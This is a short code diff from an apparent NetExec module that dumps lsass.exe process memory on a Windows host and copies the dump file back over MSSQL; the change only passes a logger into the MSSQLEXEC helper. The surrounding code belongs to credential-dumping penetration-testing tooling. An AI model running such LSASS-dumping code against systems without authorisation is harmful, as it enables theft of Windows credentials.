@@ -174,7 +174,7 @@ class NXCModule:
                     self.context.log.fail(f"Error deleting lsass.dmp file on share {self.share}: {e}")
             else:
                 try:
-                    exec_method = MSSQLEXEC(self.connection.conn)
+                    exec_method = MSSQLEXEC(self.connection.conn, self.context.log)
                     exec_method.get_file(self.remote_tmp_dir + nano_log_name, filename)
                     self.context.log.success(f"Dumpfile of lsass.exe was transferred to {filename}")
                 except Exception as e:
